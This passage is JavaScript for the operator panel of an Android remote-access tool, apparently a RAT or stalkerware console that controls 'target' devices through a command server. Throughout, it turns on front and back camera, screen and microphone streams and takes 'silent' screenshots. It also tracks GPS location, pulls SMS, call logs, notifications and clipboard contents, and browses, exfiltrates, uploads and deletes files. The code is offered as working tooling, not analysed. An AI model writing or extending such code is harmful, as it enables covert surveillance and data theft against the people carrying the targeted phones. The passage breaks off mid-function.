    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">🔔</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(notif.title || 'Notification')} (${escapeHtml(notif.appName)})</div>
        <div class="data-desc">${escapeHtml(notif.text || '')}</div>
      </div>
      <div class="data-time">${escapeHtml(notif.timestamp || '')}</div>
    `;
    notificationsList.appendChild(item);
  });
}

function renderCallLogs(list) {
  if (!callLogList) return;
  callLogList.innerHTML = '';
  if (!list || list.length === 0) {
    callLogList.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">No call logs available.</div>';
    return;
  }
  list.forEach(call => {
    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">📞</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(call.number)} (${escapeHtml(call.type)})</div>
        <div class="data-desc">Duration: ${call.duration}s</div>
      </div>
      <div class="data-time">${escapeHtml(call.date)}</div>
    `;
    callLogList.appendChild(item);
  });
}

function renderSmsMessages(list) {
  if (!smsList) return;
  smsList.innerHTML = '';
  if (!list || list.length === 0) {
    smsList.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">No SMS messages captured.</div>';
    return;
  }
  list.forEach(sms => {
    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">💬</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(sms.address)} (${escapeHtml(sms.type)})</div>
        <div class="data-desc">${escapeHtml(sms.body)}</div>
      </div>
      <div class="data-time">${escapeHtml(sms.date)}</div>
    `;
    smsList.appendChild(item);
  });
}

function renderAppsList(list) {
  if (!appList) return;
  appList.innerHTML = '';
  if (!list || list.length === 0) {
    appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No applications profiles synchronized yet. Click sync.</div>';
    return;
  }
  list.forEach(app => {
    const item = document.createElement('div');
    item.className = 'data-item';
    item.innerHTML = `
      <div class="data-icon">📱</div>
      <div class="data-details">
        <div class="data-title">${escapeHtml(app.name)}</div>
        <div class="data-desc">${escapeHtml(app.package)} (v${escapeHtml(app.version)})</div>
      </div>
      <button class="btn-explorer btn-primary btn-launch-app" data-package="${escapeHtml(app.package)}" style="padding: 6px 12px; font-size: 0.75rem; box-shadow: none;">Launch</button>
    `;
    appList.appendChild(item);
  });

  appList.querySelectorAll('.btn-launch-app').forEach(btn => {
    btn.addEventListener('click', (e) => {
      if (!selectedDeviceId) return;
      const pkg = e.target.getAttribute('data-package');
      logDebug(`[CMD] Request launch for application: ${pkg} on ${selectedDeviceId}`);
      socket.emit('cmd:launch_app', { to: selectedDeviceId, packageName: pkg });
    });
  });
}

// ─────────────────────────────────────────────────────────────
// File Explorer Logic (Per Active Device)
// ─────────────────────────────────────────────────────────────

function requestFileList(path, deviceId) {
  const target = deviceId || selectedDeviceId;
  if (!target) return;
  const dev = devices.get(target);
  if (dev) dev.currentPath = path;
  if (fsPathInput) fsPathInput.value = path;
  logDebug(`[FS] Requesting directory listing: ${path} on ${target}`);
  socket.emit('fs:list', { to: target, path: path });
}

function renderFileList(files, path) {
  if (!fileListDiv) return;
  fileListDiv.innerHTML = '';

  if (path && selectedDeviceId) {
    const dev = devices.get(selectedDeviceId);
    if (dev) {
      dev.currentPath = path;
      dev.files = files;
    }
    if (fsPathInput) fsPathInput.value = path;
  }

  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">This directory is empty.</div>';
    return;
  }

  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  files.forEach(file => {
    const item = document.createElement('div');
    item.className = 'file-item';

    const icon = document.createElement('span');
    icon.className = 'file-icon';
    icon.textContent = file.isDir ? '📁' : '📄';

    const info = document.createElement('div');
    info.className = 'file-info';

    const name = document.createElement('div');
    name.className = 'file-name';
    name.textContent = file.name;
    if (file.isDir) name.style.color = 'var(--primary)';

    const size = document.createElement('div');
    size.className = 'file-size';
    size.textContent = file.isDir ? 'Folder' : formatBytes(file.size);

    info.appendChild(name);
    info.appendChild(size);

    const actions = document.createElement('div');
    actions.className = 'file-actions';

    if (!file.isDir) {
      const downloadBtn = document.createElement('button');
      downloadBtn.className = 'btn-file-action download';
      downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
      downloadBtn.onclick = (e) => {
        e.stopPropagation();
        if (selectedDeviceId) socket.emit('fs:download', { to: selectedDeviceId, path: file.path });
      };
      actions.appendChild(downloadBtn);
    }

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'btn-file-action delete';
    deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
    deleteBtn.onclick = (e) => {
      e.stopPropagation();
      if (confirm(`Permanently delete ${file.name}?`)) {
        if (selectedDeviceId) socket.emit('fs:delete', { to: selectedDeviceId, path: file.path });
      }
    };
    actions.appendChild(deleteBtn);

    item.appendChild(icon);
    item.appendChild(info);
    item.appendChild(actions);

    if (file.isDir) {
      item.onclick = () => requestFileList(file.path, selectedDeviceId);
    }

    fileListDiv.appendChild(item);
  });
}

fsGoBtn?.addEventListener('click', () => {
  if (selectedDeviceId && fsPathInput) requestFileList(fsPathInput.value, selectedDeviceId);
});

fsBackBtn?.addEventListener('click', () => {
  const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;
  let path = dev?.currentPath || fsPathInput.value || '/storage/emulated/0/';
  if (path.endsWith('/') && path.length > 1) path = path.slice(0, -1);
  const lastSlash = path.lastIndexOf('/');
  const parent = (lastSlash !== -1) ? (path.substring(0, lastSlash + 1) || '/') : '/';
  if (selectedDeviceId) requestFileList(parent, selectedDeviceId);
});

// File Upload
fsUploadArea?.addEventListener('click', () => fsUploadInput?.click());
fsUploadInput?.addEventListener('change', (e) => {
  if (e.target.files.length > 0) uploadTargetFile(e.target.files[0]);
});

function uploadTargetFile(file) {
  if (!selectedDeviceId) {
    alert('Select an active Android target first.');
    return;
  }

  const dev = devices.get(selectedDeviceId);
  const curPath = dev?.currentPath || '/storage/emulated/0/';
  logDebug(`[FS] Uploading: ${file.name} to ${curPath}`);
  if (fsUploadLabel) fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;

  const reader = new FileReader();
  reader.onload = async (event) => {
    const rawBuffer = event.target.result;
    const chunkSize = 64 * 1024;
    const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);

    socket.emit('fs:upload_start', {
      to: selectedDeviceId,
      filename: file.name,
      parentPath: curPath,
      totalChunks: totalChunks
    });

    for (let idx = 0; idx < totalChunks; idx++) {
      const start = idx * chunkSize;
      const end = Math.min(start + chunkSize, rawBuffer.byteLength);
      const slice = rawBuffer.slice(start, end);
      const binary = String.fromCharCode.apply(null, new Uint8Array(slice));
      const base64 = btoa(binary);

      socket.emit('fs:upload_chunk', {
        to: selectedDeviceId,
        chunk: base64
      });

      const pct = Math.floor(((idx + 1) / totalChunks) * 100);
      if (fsUploadProgress) fsUploadProgress.style.width = `${pct}%`;
      if (fsUploadLabel) fsUploadLabel.textContent = `Uploading ${file.name}... (${pct}%)`;
      await new Promise(r => setTimeout(r, 10));
    }

    socket.emit('fs:upload_complete', { to: selectedDeviceId });
    if (fsUploadLabel) fsUploadLabel.textContent = 'Upload complete!';
    setTimeout(() => {
      if (fsUploadLabel) fsUploadLabel.textContent = 'Drag files here or click to upload';
      if (fsUploadProgress) fsUploadProgress.style.width = '0%';
    }, 4000);
  };
  reader.readAsArrayBuffer(file);
}

// ─────────────────────────────────────────────────────────────
// Hardware Controls Emitters (Active Device)
// ─────────────────────────────────────────────────────────────

volumeSlider?.addEventListener('input', (e) => {
  if (volumeVal) volumeVal.textContent = `${e.target.value}%`;
});

volumeSlider?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const val = parseInt(e.target.value);
  const dev = devices.get(selectedDeviceId);
  if (dev) dev.volume = val;
  socket.emit('cmd:set_volume', { to: selectedDeviceId, stream: 'music', pct: val });
});

brightnessSlider?.addEventListener('input', (e) => {
  if (brightnessVal) brightnessVal.textContent = `${e.target.value}%`;
});

brightnessSlider?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const val = parseInt(e.target.value);
  const dev = devices.get(selectedDeviceId);
  if (dev) dev.brightness = val;
  socket.emit('cmd:set_brightness', { to: selectedDeviceId, pct: val });
});

flashlightToggle?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const isChecked = e.target.checked;
  const dev = devices.get(selectedDeviceId);
  if (dev) dev.flashlight = isChecked;
  socket.emit('cmd:flashlight', { to: selectedDeviceId, on: isChecked });
});

videoQualitySelect?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const quality = e.target.value;
  const dev = devices.get(selectedDeviceId);
  if (dev) dev.quality = quality;
  socket.emit('cmd:set_quality', { to: selectedDeviceId, quality: quality });
});

// Focused View Controls
btnToggleFrontCam?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev) return;
  const next = !dev.isFrontStreaming;
  socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'front', active: next });
});

btnStartFrontCamOverlay?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'front', active: true });
});

btnToggleBackCam?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev) return;
  const next = !dev.isBackStreaming;
  socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'back', active: next });
});

btnStartBackCamOverlay?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:stream_camera', { to: selectedDeviceId, camera: 'back', active: true });
});

btnToggleScreen?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev) return;
  const next = !dev.isScreenStreaming;
  logDebug(`[SCREEN STREAM] Requesting ${next ? 'START' : 'STOP'} for ${dev.info.model || selectedDeviceId}`);
  dev.isScreenStreaming = next;
  updateFocusStreams();
  socket.emit('cmd:stream_screen', { to: selectedDeviceId, enable: next });
});

btnStartScreenOverlay?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (dev) {
    dev.isScreenStreaming = true;
    updateFocusStreams();
  }
  logDebug(`[SCREEN STREAM] Requesting START for ${selectedDeviceId}`);
  socket.emit('cmd:stream_screen', { to: selectedDeviceId, enable: true });
});

btnFullscreenScreen?.addEventListener('click', () => {
  if (!cardScreenFeed) return;
  if (!document.fullscreenElement) {
    if (cardScreenFeed.requestFullscreen) {
      cardScreenFeed.requestFullscreen();
    } else if (cardScreenFeed.webkitRequestFullscreen) {
      cardScreenFeed.webkitRequestFullscreen();
    }
  } else {
    if (document.exitFullscreen) {
      document.exitFullscreen();
    }
  }
});

document.addEventListener('fullscreenchange', () => {
  if (btnFullscreenScreen) {
    const isFull = !!document.fullscreenElement;
    const span = btnFullscreenScreen.querySelector('span');
    if (span) span.textContent = isFull ? 'Exit' : 'Expand';
  }
});

btnStreamMic?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev) return;
  const next = !dev.isMicStreaming;
  socket.emit('cmd:stream_mic', { to: selectedDeviceId, active: next });
});

btnToggleLocation?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev) return;
  const next = !dev.isLocationStreaming;
  const interval = parseInt(gpsIntervalSelect?.value) || 10000;
  socket.emit('cmd:stream_location', { to: selectedDeviceId, active: next, intervalMs: interval });
});

gpsIntervalSelect?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const val = parseInt(e.target.value);
  socket.emit('cmd:set_gps_interval', { to: selectedDeviceId, intervalMs: val });
});

btnRefreshLocation?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:ping', { to: selectedDeviceId });
});

// Quick Actions
btnVibrate?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:vibrate', { to: selectedDeviceId, duration: 800 });
});

btnRing?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:ring', { to: selectedDeviceId });
});

btnSwitchCamera?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:camera_switch', { to: selectedDeviceId });
});

btnRecord?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:record', { to: selectedDeviceId });
});

sensorsToggle?.addEventListener('change', (e) => {
  if (!selectedDeviceId) return;
  const isChecked = e.target.checked;
  const dev = devices.get(selectedDeviceId);
  if (dev) dev.isSensorsActive = isChecked;
  socket.emit('cmd:toggle_sensors', { to: selectedDeviceId, active: isChecked });
});

btnRefreshNetwork?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:get_network', { to: selectedDeviceId });
});

btnFetchClipboard?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:get_clipboard', { to: selectedDeviceId });
});

btnSetClipboard?.addEventListener('click', () => {
  if (!selectedDeviceId || !clipboardTextArea) return;
  socket.emit('cmd:set_clipboard', { to: selectedDeviceId, text: clipboardTextArea.value });
});

btnSnapFront?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: true });
});

btnSnapBack?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  socket.emit('cmd:take_snapshot', { to: selectedDeviceId, useFront: false });
});

btnSnapScreen?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  const name = dev ? (dev.info.model || selectedDeviceId) : selectedDeviceId;
  logDebug(`Requesting silent screenshot from ${name}...`);
  socket.emit('cmd:take_screenshot', { to: selectedDeviceId });
});

// Modals
btnToast?.addEventListener('click', () => {
  openModal('Push Notification Alert', 'Enter message text to display on target device:', 'Command Center Alert', (text) => {
    if (selectedDeviceId) socket.emit('cmd:toast', { to: selectedDeviceId, text: text });
  });
});

btnOpenUrl?.addEventListener('click', () => {
  openModal('Launch Target Web URL', 'Enter full URL to open on target device browser:', 'https://google.com', (url) => {
    if (selectedDeviceId) socket.emit('cmd:open_url', { to: selectedDeviceId, url: url });
  });
});

function openModal(title, description, defaultValue, callback) {
  if (dialogTitle) dialogTitle.textContent = title;
  if (dialogDesc) dialogDesc.textContent = description;
  if (dialogInput) dialogInput.value = defaultValue;
  if (dialogOverlay) dialogOverlay.classList.add('active');
  currentModalAction = callback;
}

function closeModal() {
  if (dialogOverlay) dialogOverlay.classList.remove('active');
  currentModalAction = null;
}

dialogBtnCancel?.addEventListener('click', closeModal);
dialogBtnConfirm?.addEventListener('click', () => {
  if (currentModalAction && dialogInput) currentModalAction(dialogInput.value);
  closeModal();
});

// Snapshots Modal
btnCloseSnapshot?.addEventListener('click', () => {
  if (snapshotModal) snapshotModal.classList.remove('active');
  if (snapshotPreview) snapshotPreview.src = '';
  currentSnapshotBase64 = null;
});

btnDownloadSnapshot?.addEventListener('click', () => {
  if (currentSnapshotBase64) {
    downloadBase64File(currentSnapshotBase64, `snapshot_${Date.now()}.jpg`);
  }
});

function downloadBase64File(base64Data, fileName) {
  const linkSource = `data:application/octet-stream;base64,${base64Data}`;
  const downloadLink = document.createElement("a");
  downloadLink.href = linkSource;
  downloadLink.download = fileName;
  downloadLink.click();
}

// Screenshot Trigger & Modal
btnScreenshot?.addEventListener('click', () => {
  if (!selectedDeviceId) {
    alert('Please select a device from the left sidebar first.');
    return;
  }
  const dev = devices.get(selectedDeviceId);
  const name = dev ? (dev.info.model || selectedDeviceId) : selectedDeviceId;
  logDebug(`Requesting silent screenshot from ${name}...`);
  socket.emit('cmd:take_screenshot', { to: selectedDeviceId });
});

btnCloseScreenshot?.addEventListener('click', () => {
  if (screenshotModal) screenshotModal.classList.remove('active');
  if (screenshotPreview) screenshotPreview.src = '';
  currentScreenshotBase64 = null;
});

btnDownloadScreenshot?.addEventListener('click', () => {
  if (currentScreenshotBase64) {
    downloadBase64File(currentScreenshotBase64, `screenshot_${Date.now()}.jpg`);
  }
});

// Voice Broadcast (TTS)
ttsPitch?.addEventListener('input', (e) => {
  if (ttsPitchVal) ttsPitchVal.textContent = parseFloat(e.target.value).toFixed(1);
});

ttsSpeed?.addEventListener('input', (e) => {
  if (ttsSpeedVal) ttsSpeedVal.textContent = parseFloat(e.target.value).toFixed(1);
});

btnTtsSpeak?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  const text = ttsText?.value.trim();
  const pitch = parseFloat(ttsPitch?.value || '1.0');
  const speed = parseFloat(ttsSpeed?.value || '1.0');
  if (!text) return;
  socket.emit('cmd:tts_speak', { to: selectedDeviceId, text: text, pitch: pitch, speed: speed });
});

// Talkback Intercom
talkbackToggle?.addEventListener('click', async () => {
  if (!selectedDeviceId) return;
  const dev = devices.get(selectedDeviceId);
  if (!dev || !dev.peer) return;

  if (isTalkbackActive) {
    isTalkbackActive = false;
    talkbackToggle.textContent = '🎙️ Talkback OFF';
    talkbackToggle.style.color = 'var(--text-muted)';
    talkbackToggle.style.background = 'transparent';
    if (localMicSender) {
      try { dev.peer.removeTrack(localMicSender); } catch(e) {}
      localMicSender = null;
    }
    if (localMicStream) {
      localMicStream.getTracks().forEach(t => t.stop());
      localMicStream = null;
    }
    logDebug('[TALKBACK] Intercom suspended');
  } else {
    try {
      localMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const track = localMicStream.getAudioTracks()[0];
      localMicSender = dev.peer.addTrack(track, localMicStream);
      const offer = await dev.peer.createOffer();
      await dev.peer.setLocalDescription(offer);
      socket.emit('signal', {
        to: selectedDeviceId,
        from: myId,
        signal: { type: 'offer', sdp: offer.sdp }
      });
      isTalkbackActive = true;
      talkbackToggle.textContent = '🎙️ Talkback ACTIVE';
      talkbackToggle.style.color = '#10b981';
      talkbackToggle.style.background = 'rgba(16, 185, 129, 0.1)';
      logDebug(`[TALKBACK] Broadcasting voice to ${dev.info.model || selectedDeviceId}`);
    } catch(err) {
      logDebug('[TALKBACK] Mic capture blocked: ' + err.message);
    }
  }
});

// ─────────────────────────────────────────────────────────────
// Socket Server Event Subscriptions & Routing
// ─────────────────────────────────────────────────────────────

socket.on('connect', () => {
  updateStatus('Connected to Command server');
});

socket.on('connect_error', () => {
  updateStatus('Failed to connect to signaling host');
});

socket.on('id', (id) => {
  myId = id;
  logDebug(`Authenticated session ID: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
});

socket.on('android-client-ready', (id) => {
  logDebug(`[NETWORK] Android client detected: ${id}`);
  const dev = getOrCreateDevice(id);
  // Send initial ping to fetch device profile & location
  socket.emit('cmd:ping', { to: id });
  renderDevicesList();
});

socket.on('android-client-disconnected', (id) => {
  logDebug(`[NETWORK] Android client disconnected: ${id}`);
  removeDevice(id);
});

// WebRTC Signaling Handler
socket.on('signal', async (data) => {
  const from = data.from;
  const signal = data.signal;
  if (!from || !signal) return;

  const dev = getOrCreateDevice(from);

  // Recording status signal
  if (signal.type === 'recording_status') {
    dev.isRecording = !!signal.active;
    if (dev.info) dev.info.recording = dev.isRecording;
    if (selectedDeviceId === from) updateRecordingButton(dev.isRecording);
    logDebug(`[REC] [${dev.info.model || from}] Recording ${signal.active ? 'STARTED' : 'STOPPED'}`);
    if (!signal.active) requestFileList(dev.currentPath, from);
    return;
  }

  // Initialize per-device RTCPeerConnection
  if (!dev.peer || dev.peer.signalingState === 'closed') {
    logDebug(`[WEBRTC] Creating peer connection for device: ${dev.info.model || from}`);
    try {
      dev.peer = new RTCPeerConnection(rtcConfig);
      dev.peer.addTransceiver('video', { direction: 'recvonly' });
      dev.peer.addTransceiver('video', { direction: 'recvonly' });
      dev.peer.addTransceiver('video', { direction: 'recvonly' });
      dev.peer.addTransceiver('audio', { direction: 'recvonly' });

      dev.peer.ontrack = (event) => {
        const track = event.track;
        if (track.kind === 'audio') {
          dev.audioTrack = track;
          if (selectedDeviceId === from) {
            updateAudioStream();
          }
        } else if (track.kind === 'video') {
          if (track.id.includes('screen') || track.id === 'screen_video') {
            dev.screenTrack = track;
          } else if (track.id.includes('front') || track.id === 'front_video' || track.id === 'front_camera') {
            dev.frontTrack = track;
          } else if (track.id.includes('back') || track.id === 'back_video' || track.id === 'back_camera') {
            dev.backTrack = track;
          } else if (!dev.frontTrack) {
            dev.frontTrack = track;
          } else if (!dev.backTrack) {
            dev.backTrack = track;
          } else if (!dev.screenTrack) {
            dev.screenTrack = track;
          }
          renderDevicesList();
          if (selectedDeviceId === from) {
            updateFocusStreams();
          }
        }
      };

      dev.peer.onicecandidate = (e) => {
        if (e.candidate) {
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      dev.peer.oniceconnectionstatechange = () => {
        logDebug(`[WEBRTC] [${dev.info.model || from}] ICE State: ${dev.peer.iceConnectionState}`);
      };
    } catch(err) {
      console.error('Failed to create peer connection for device:', from, err);
    }
  }

  try {
    if (signal.type === 'offer') {
      logDebug(`[WEBRTC] Received offer from ${dev.info.model || from}, answering...`);
      await dev.peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await dev.peer.createAnswer();
      await dev.peer.setLocalDescription(answer);
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
      logDebug(`[WEBRTC] Dispatched answer to ${dev.info.model || from}`);
    } else if (signal.candidate) {
      await dev.peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error(`Signaling processing error with device ${from}:`, err);
  }
});

// Device Info Telemetry Profile
socket.on('device_info', (info) => {
  const deviceId = info.from || selectedDeviceId || (devices.size > 0 ? Array.from(devices.keys())[0] : null);
  if (!deviceId) return;

  const dev = getOrCreateDevice(deviceId);
  logDebug(`[TELEMETRY] Device profile updated for ${info.model || deviceId}`);

  if (info.model) dev.info.model = info.model;
  if (info.manufacturer) dev.info.manufacturer = info.infoManufacturer || info.manufacturer;
  if (info.version) dev.info.version = info.version;
  if (info.battery !== undefined) dev.info.battery = info.battery;
  if (info.batteryTemp !== undefined) dev.info.batteryTemp = info.batteryTemp;
  if (info.chargingSource) dev.info.chargingSource = info.chargingSource;
  if (info.storageTotal !== undefined) dev.info.storageTotal = info.storageTotal;
  if (info.storageFree !== undefined) dev.info.storageFree = info.storageFree;
  if (info.recording !== undefined) dev.isRecording = !!info.recording;

  if (info.frontCameraStreaming !== undefined) dev.isFrontStreaming = !!info.frontCameraStreaming;
  if (info.backCameraStreaming !== undefined) dev.isBackStreaming = !!info.backCameraStreaming;
  if (info.screenStreaming !== undefined) dev.isScreenStreaming = !!info.screenStreaming;
  if (info.micStreaming !== undefined) dev.isMicStreaming = !!info.micStreaming;
  if (info.locationStreaming !== undefined) dev.isLocationStreaming = !!info.locationStreaming;

  renderDevicesList();

  if (selectedDeviceId === deviceId) {
    selectDevice(deviceId);
  }
});

// Stream Status Synchronization
socket.on('stream_status', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!deviceId) return;

  const dev = getOrCreateDevice(deviceId);
  const status = data.status || data;
  logDebug(`[STREAM_STATUS] [${dev.info.model || deviceId}] Front:${status.frontCamera} Back:${status.backCamera} Screen:${status.screen} Mic:${status.mic} GPS:${status.location}`);

  if (status.frontCamera !== undefined) dev.isFrontStreaming = !!status.frontCamera;
  if (status.backCamera !== undefined) dev.isBackStreaming = !!status.backCamera;
  if (status.screen !== undefined) dev.isScreenStreaming = !!status.screen;
  if (status.mic !== undefined) dev.isMicStreaming = !!status.mic;
  if (status.location !== undefined) dev.isLocationStreaming = !!status.location;

  renderDevicesList();
  if (selectedDeviceId === deviceId) {
    updateFocusStreams();
    updateAudioStream();
    updateLocationUI();
  }
});

// Notifications
socket.on('notification', (data) => {
  const deviceId = data.from || selectedDeviceId;
  const notif = data.notification;
  if (!notif) return;

  const dev = getOrCreateDevice(deviceId);
  dev.notifications.unshift(notif);
  if (dev.notifications.length > 50) dev.notifications.pop();

  logDebug(`[🔔 NOTIFICATION] [${dev.info.model || deviceId}] ${notif.title || ''}: ${notif.text || ''}`);

  if (selectedDeviceId === deviceId) {
    renderNotifications(dev.notifications);
  }
});

// Call Logs
socket.on('call_log', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!data.call_logs) return;

  const dev = getOrCreateDevice(deviceId);
  dev.callLogs = data.call_logs;
  logDebug(`[CALLS] Loaded ${data.call_logs.length} call logs for ${dev.info.model || deviceId}`);

  if (selectedDeviceId === deviceId) {
    renderCallLogs(dev.callLogs);
  }
});

// SMS Messages
socket.on('sms', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!data.sms_messages) return;

  const dev = getOrCreateDevice(deviceId);
  dev.smsMessages = data.sms_messages;
  logDebug(`[SMS] Loaded ${data.sms_messages.length} messages for ${dev.info.model || deviceId}`);

  if (selectedDeviceId === deviceId) {
    renderSmsMessages(dev.smsMessages);
  }
});

// Applications List
socket.on('apps_list', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!data.apps) return;

  const dev = getOrCreateDevice(deviceId);
  dev.apps = data.apps;
  logDebug(`[APPS] Synchronized ${data.apps.length} applications for ${dev.info.model || deviceId}`);

  if (selectedDeviceId === deviceId) {
    renderAppsList(dev.apps);
  }
});

// Environmental Sensors
socket.on('sensor_data', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!data.sensors) return;

  const dev = getOrCreateDevice(deviceId);
  dev.sensors = data.sensors;
  dev.sensorHistory.push({
    lux: data.sensors.lux || 0,
    accelX: data.sensors.accelX || 0,
    accelY: data.sensors.accelY || 0,
    accelZ: data.sensors.accelZ || 0
  });
  while (dev.sensorHistory.length > maxHistoryPoints) {
    dev.sensorHistory.shift();
  }

  if (selectedDeviceId === deviceId) {
    if (sensorLux && data.sensors.lux !== undefined) sensorLux.textContent = `${data.sensors.lux.toFixed(0)} Lux`;
    if (sensorProximity && data.sensors.proximity !== undefined) sensorProximity.textContent = data.sensors.proximity === 0.0 ? 'NEAR (0cm)' : 'FAR (normal)';
    if (sensorAccel && data.sensors.accelX !== undefined) sensorAccel.textContent = `X:${data.sensors.accelX.toFixed(1)} Y:${data.sensors.accelY.toFixed(1)} Z:${data.sensors.accelZ.toFixed(1)}`;
    drawSensorChart();
  }
});

// Network Analyzer
socket.on('network_info', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (!data.network) return;

  const dev = getOrCreateDevice(deviceId);
  dev.network = data.network;
  logDebug(`[NETWORK] [${dev.info.model || deviceId}] SSID=${data.network.ssid}, Speed=${data.network.linkSpeed} Mbps`);

  if (selectedDeviceId === deviceId) {
    if (netSsid) netSsid.textContent = data.network.ssid;
    if (netSpeed) netSpeed.textContent = `${data.network.linkSpeed} Mbps`;
    if (netIp) netIp.textContent = data.network.localIp;
    if (netRssi) netRssi.textContent = `${data.network.rssi} dBm`;
  }
});

// Snapshot Frame
socket.on('snapshot_data', (data) => {
  if (data.snapshot) {
    const from = data.from || selectedDeviceId;
    const dev = devices.get(from);
    logDebug(`Received camera snapshot from: ${dev ? dev.info.model : from} (${data.snapshot.camera})`);
    currentSnapshotBase64 = data.snapshot.image;
    if (snapshotPreview) snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
    if (snapshotModal) snapshotModal.classList.add('active');
  }
});

// Screenshot Frame (Silent Capture)
socket.on('screenshot_data', (data) => {
  if (data.screenshot) {
    const from = data.from || selectedDeviceId;
    const dev = devices.get(from);
    const devName = dev ? (dev.info.model || from) : from;

    if (data.screenshot.error) {
      logDebug(`[SCREENSHOT ERROR] ${devName}: ${data.screenshot.message || data.screenshot.error}`);
      alert(`Silent Screenshot Failed on ${devName}:\n\n${data.screenshot.message || data.screenshot.error}`);
      return;
    }

    if (data.screenshot.image) {
      logDebug(`[SCREENSHOT] Received silent screenshot from: ${devName}`);
      currentScreenshotBase64 = data.screenshot.image;
      if (screenshotPreview) screenshotPreview.src = `data:image/jpeg;base64,${currentScreenshotBase64}`;
      if (screenshotModal) screenshotModal.classList.add('active');
    }
  }
});

// Clipboard
socket.on('clipboard_data', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (data.clipboard !== undefined) {
    const dev = getOrCreateDevice(deviceId);
    dev.clipboard = data.clipboard;
    if (selectedDeviceId === deviceId && clipboardTextArea) {
      clipboardTextArea.value = data.clipboard;
    }
    logDebug(`[CLIPBOARD] Synced text from ${dev.info.model || deviceId}`);
  }
});

// GPS Location Telemetry
socket.on('location', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (deviceId && data.latitude !== undefined && data.longitude !== undefined) {
    updateDeviceLocation(deviceId, data.latitude, data.longitude);
  }
});

// File System Events
socket.on('fs:files', (data) => {
  const deviceId = data.from || selectedDeviceId;
  if (data.file_list) {
    const dev = getOrCreateDevice(deviceId);
    dev.files = data.file_list.files;
